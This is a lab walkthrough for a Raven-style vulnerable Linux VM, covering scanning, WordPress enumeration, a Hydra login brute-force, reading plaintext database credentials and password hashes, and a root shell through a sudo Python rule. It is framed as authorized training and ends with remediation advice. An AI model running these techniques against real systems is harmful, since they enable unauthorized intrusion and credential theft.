# Raven-Style Linux Web and Privilege-Escalation Lab

> **Authorized-lab use only.** This material is written for an intentionally vulnerable virtual machine or another system you own or have explicit permission to test. Replace the example target address with the address assigned to your lab machine.

## Learning objectives

This exercise demonstrates a practical penetration-testing workflow: discovering exposed services, enumerating a web application, identifying credentials in an authorized lab, examining local files and databases, testing account privileges, and documenting evidence. The goal is not to attack a real system, but to understand how each observation leads to the next controlled test.

The examples use a target called `raven.local` and an example address of `172.16.250.3`. Your virtual machine may receive a different address. Never assume that an address, username, password, hash, or file path from this document exists outside the lab.

## 1. Confirm the lab network

Before scanning, confirm that the attacker and target virtual machines are attached to the same isolated host-only or training network. A discovery command can help identify active devices:

```bash
sudo netdiscover -r 172.16.250.0/24
```

Example output:

```text
Currently scanning: 172.16.250.0/24
IP                 MAC Address        Vendor
172.16.250.3       08:00:27:AA:BB:CC  VirtualBox
```

The output associates an IP address with a network-interface MAC address. In a real lab, the vendor field may identify a virtualization platform, but it does not prove which host is the target. Confirm the address from the challenge console or your own lab configuration before testing it.

Add a local name only if doing so helps readability:

```bash
echo '172.16.250.3 raven.local' | sudo tee -a /etc/hosts
getent hosts raven.local
```

Example output:

```text
172.16.250.3   raven.local
```

The first command creates a local mapping; it does not change DNS or the target machine. The second command verifies that the local resolver returns the intended address.

## 2. Discover exposed services

Start with a focused TCP scan:

```bash
nmap -sV -sC -p- 172.16.250.3 -oN nmap-raven.txt
```

Representative output:

```text
PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 6.7p1 Debian 5+deb8u4
80/tcp  open  http    Apache httpd 2.4.10 (Debian)
111/tcp open  rpcbind 2-4 (RPC)

Service detection performed. Please report any incorrect results.
```

`-p-` checks all TCP ports rather than only the common ports. `-sV` requests service and version identification, while `-sC` runs Nmap's default scripts. The result shows three possible attack surfaces: SSH for remote login, HTTP for web content, and RPC bind for network service discovery. Version strings are clues, not automatic proof of vulnerability; verify findings in the context of the lab.

The `-oN` option saves a human-readable record. Keeping scan output is important because it provides a baseline and makes later notes reproducible.

## 3. Enumerate the website

Request the home page and inspect its headers:

```bash
curl -i http://raven.local/
```

Example output:

```text
HTTP/1.1 200 OK
Server: Apache/2.4.10 (Debian)
Content-Type: text/html; charset=UTF-8

<html> ... </html>
```

The status code indicates whether the request succeeded. The `Server` header suggests the web-server software, although headers can be inaccurate or intentionally hidden. The body is the page content that should be reviewed manually for links, comments, forms, and references to application directories.

Inspect common directories with a wordlist:

```bash
gobuster dir -u http://raven.local/ -w /usr/share/wordlists/dirb/common.txt -x php,html,txt
```

Representative output:

```text
/status:           200
/wordpress:        301
/server-status:    403
```

A `200` response normally means content was returned. A `301` redirect indicates that the path exists and points somewhere else, often a directory with a trailing slash. A `403` means the server recognized the resource but denied access; it still confirms that the path may exist. Validate interesting results manually rather than treating every response as a finding.

You can also perform a basic web-server review:

```bash
nikto -h http://raven.local/
```

Example output:

```text
+ Server: Apache/2.4.10 (Debian)
+ Retrieved x-powered-by header: PHP/5.6.x
+ Uncommon header 'x-frame-options' found
+ /wordpress/: Potentially interesting directory
```

Nikto reports observations and common configuration issues. It is noisy and may produce false positives, so use it as an enumeration aid, not as a final vulnerability assessment.

### Source-code comments

Save the HTML and search for comments or flag-like strings:

```bash
curl -s http://raven.local/ > index.html
grep -inE 'flag|comment|todo|hidden' index.html
```

Example output:

```text
87:<!-- Training flag: FLAG{example_source_review} -->
```

The line number helps locate the relevant text. HTML comments are sent to the browser even though they are not displayed in the rendered page, so sensitive data must never be placed there. In a real assessment, report exposed secrets without publishing them unnecessarily.

## 4. Identify the content-management system

If a WordPress installation appears under `/wordpress`, inspect it with a scanner configured for that path:

```bash
wpscan --url http://raven.local/wordpress/ --enumerate u,vt --plugins-detection passive
```

Representative output:

```text
[i] WordPress version detected: 4.x
[+] URL: http://raven.local/wordpress/
[i] User(s) Identified:
    steven
    michael
```

The user-enumeration result indicates that the application exposes account names. It does not reveal passwords, and it should be treated as sensitive information. Version and plugin results are hypotheses that require confirmation and careful comparison with trusted vulnerability advisories.

Use scanners only against systems for which you have authorization. Avoid aggressive request rates in shared environments, because enumeration can affect availability and may trigger defensive controls.

## 5. Understand login requests safely

For a training application, browser developer tools can show how a login form submits data. Inspect the form's method, action, parameter names, and failure response. A generic request may look like this:

```text
POST /wordpress/wp-login.php
Content-Type: application/x-www-form-urlencoded

log=USER&pwd=PASSWORD&wp-submit=Log+In
```

The important lesson is that an automated test must match the application's actual request format and failure condition. Do not copy a form request from one application to another without verifying it. Password guessing should be performed only with explicit permission, a small approved wordlist, a rate limit, and a documented stopping condition.

For example, in an isolated lab and with authorization, a controlled Hydra syntax may be structured as follows. Keep placeholders until you have confirmed the form fields:

```bash
hydra -l steven -P ./approved-lab-wordlist.txt raven.local http-post-form \
'/wordpress/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=incorrect' \
-t 4 -f -V
```

Representative output:

```text
[80][http-post-form] host: raven.local   login: steven   password: training-password
1 valid password found
```

`^USER^` and `^PASS^` are Hydra substitutions. The `F=` expression tells Hydra how to recognize a failed login; it must match the actual application's response. `-t 4` limits parallel tasks, and `-f` stops after a valid result. A result is not trustworthy unless you manually verify it through the authorized login interface.

## 6. Test SSH credentials in the lab

If a lab account is supplied or discovered through an authorized exercise, test it directly rather than repeatedly guessing:

```bash
ssh michael@raven.local
```

Representative output:

```text
michael@raven.local's password:
Linux raven 3.x Debian GNU/Linux
michael@raven:~$
```

The shell prompt shows that authentication succeeded as `michael`. It does not imply administrative access. Record the account name and connection time, then begin with low-impact local enumeration.

Check identity and basic host context:

```bash
id
hostname
pwd
```

Example output:

```text
uid=1001(michael) gid=1001(michael) groups=1001(michael)
raven
/home/michael
```

`id` shows the numeric user and group identities. `hostname` identifies the machine, and `pwd` identifies the current directory. These checks prevent confusion when multiple lab machines or shells are open.

## 7. Examine local mail and web files

Locate mail using the system database when available:

```bash
locate /var/mail 2>/dev/null
ls -la /var/mail
cat /var/mail/michael
```

Representative output:

```text
/var/mail
/var/mail/michael
From admin@raven.local ...
Subject: maintenance note
The staging application uses the same credentials as the lab account.
```

`locate` searches an index and may be incomplete or outdated. `ls -la` displays ownership, permissions, and timestamps. `cat` prints the file, but large messages should be copied and inspected carefully. Mail can contain useful operational information in a lab, while in real environments it is private data and must be handled under explicit authorization.

Review web directories without changing files:

```bash
find /var/www -maxdepth 3 -type f -printf '%M %u %g %p
' 2>/dev/null
```

Representative output:

```text
-rw-r--r-- www-data www-data /var/www/html/index.php
-rw-r--r-- www-data www-data /var/www/html/flag2.txt
-rw-r--r-- www-data www-data /var/www/html/wordpress/wp-config.php
```

The output shows permissions, owner, group, and path. `wp-config.php` is particularly important because WordPress commonly stores database connection settings there. A file listing alone is not proof that the current user can read every file; test access explicitly and do not modify application data.

## 8. Protect configuration secrets

A configuration file may contain credentials in plaintext:

```bash
sed -n '1,160p' /var/www/html/wordpress/wp-config.php
```

Representative output:

```text
define('DB_NAME', 'wordpress');
define('DB_USER', 'root');
define('DB_PASSWORD', 'R@v3nSecurity');
define('DB_HOST', 'localhost');
```

These values identify the database name, account, password, and host. In a vulnerable lab they demonstrate why configuration files must have restrictive permissions and why database accounts should not be reused for operating-system access. Do not expose real credentials in reports; redact them and rotate them when discovered.

A safer way to document the finding is to record only the presence and location of a secret:

```bash
stat -c '%A %U:%G %n' /var/www/html/wordpress/wp-config.php
```

Example output:

```text
-rw-r--r-- www-data:www-data /var/www/html/wordpress/wp-config.php
```

The mode shows that the file is readable by the owner, group, and others. A production configuration file containing secrets should generally be readable only by the service account and administrators, according to the deployment design.

## 9. Inspect the database

Using credentials authorized for the lab, connect locally:

```bash
mysql -u root -p
```

After entering the password at the prompt, use read-only discovery queries:

```sql
SHOW DATABASES;
USE wordpress;
SHOW TABLES;
SELECT ID, user_login, user_pass FROM wp_users;
```

Representative output:

```text
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| wordpress          |
+--------------------+

+----------------+
| Tables_in_wordpress |
+----------------+
| wp_options     |
| wp_posts       |
| wp_users       |
+----------------+

+----+------------+----------------------------------+
| ID | user_login | user_pass                        |
+----+------------+----------------------------------+
|  1 | steven     | $P$...redacted-hash...           |
|  2 | michael    | $P$...redacted-hash...           |
+----+------------+----------------------------------+
```

`SHOW DATABASES` lists databases visible to the account. `USE` changes the active database, and `SHOW TABLES` lists its tables. The `wp_users` query retrieves account names and password hashes; a hash is not the original password, but weak passwords may be recoverable through offline auditing. Store hashes securely, avoid placing them in public notes, and use only approved wordlists and hardware in a lab.

Export only redacted evidence for documentation:

```bash
mysql -u root -p -D wordpress -e \
'SELECT ID,user_login FROM wp_users;' > wordpress-users.txt
cat wordpress-users.txt
```

Example output:

```text
ID  user_login
1   steven
2   michael
```

This command records account identifiers without copying password hashes. The `-e` option executes one query and exits, which is useful for repeatable evidence collection.

## 10. Check privilege boundaries

For each authorized shell account, inspect permitted `sudo` commands:

```bash
sudo -l
```

Representative output for a restricted account:

```text
User michael may not run sudo on raven.
```

Representative output for a misconfigured account:

```text
User steven may run the following commands on raven:
    (root) /usr/bin/python
```

`sudo -l` displays commands the current user may run through `sudo`. The second result means the account can execute the specified interpreter as root, which is a serious privilege boundary failure because general-purpose interpreters can often execute operating-system commands. In a real system, remove the broad rule and replace it with a narrowly scoped administrative command or a safer service mechanism.

## 11. Demonstrate the impact in the lab

Only inside the intentionally vulnerable lab, the permitted interpreter can be used to demonstrate that the rule crosses the user-to-root boundary:

```bash
sudo /usr/bin/python -c 'import os; print(os.geteuid()); print(os.getuid())'
```

Example output:

```text
0
0
```

On Linux, effective user ID `0` is root. The output proves that the interpreter was launched with root privileges. This non-interactive demonstration is safer and clearer than immediately opening a full root shell because it confirms impact with minimal action.

Some training environments demonstrate an interactive shell using a pseudo-terminal:

```bash
sudo /usr/bin/python -c 'import pty; pty.spawn("/bin/bash")'
```

Example output:

```text
root@raven:/home/steven# id
uid=0(root) gid=0(root) groups=0(root)
```

`pty.spawn` attaches a shell to a pseudo-terminal, improving interactive behavior. The `id` output confirms the privilege level. Do not use this technique on systems without authorization; the appropriate defensive response is to remove the unsafe `sudoers` entry and audit command execution logs.

## 12. Locate and document final evidence

Once root access has been demonstrated in the lab, search only the challenge directories or explicitly authorized paths:

```bash
find /root /home /var/www -maxdepth 3 -type f -iname '*flag*' -print 2>/dev/null
```

Representative output:

```text
/root/flag4.txt
/home/steven/flag3.txt
/var/www/html/flag2.txt
```

The command searches for filenames containing `flag`, limits recursion to three levels, and suppresses permission errors. Read the files only as required by the exercise, then record their locations and the access path rather than publishing unnecessary secret content.

A professional finding should connect evidence to remediation: exposed source comments should be removed; web directories and CMS components should be kept current; credentials should not be stored in publicly readable configuration files; password reuse should be eliminated; database accounts should use least privilege; and `sudoers` entries should allow only tightly constrained commands.

## Defensive review checklist

- Restrict laboratory targets to an isolated network and confirm authorization before scanning.
- Disable directory listings and remove comments or files that reveal secrets.
- Keep the web server, PHP runtime, CMS, themes, and plugins updated.
- Store secrets in protected configuration or a secrets manager, with restrictive file permissions.
- Use unique, long passwords and multi-factor authentication where practical.
- Give database accounts only the privileges required by the application; never use a database superuser for routine web access.
- Review `sudoers` rules for interpreters, editors, shells, and other programs that can execute arbitrary commands.
- Log and review authentication, database, web-server, and privilege-escalation events.
- Rotate any credential that may have been exposed and preserve sanitized evidence for the incident record.

## Key takeaways

A strong assessment is a chain of verified observations: a port identifies a service, enumeration reveals application paths, source and configuration review expose weaknesses, database inspection explains account relationships, and `sudo -l` reveals the final privilege boundary. At every step, save command output, explain what it proves, and distinguish confirmed facts from hypotheses. The same workflow supports both offensive learning in a sandbox and defensive remediation in production.
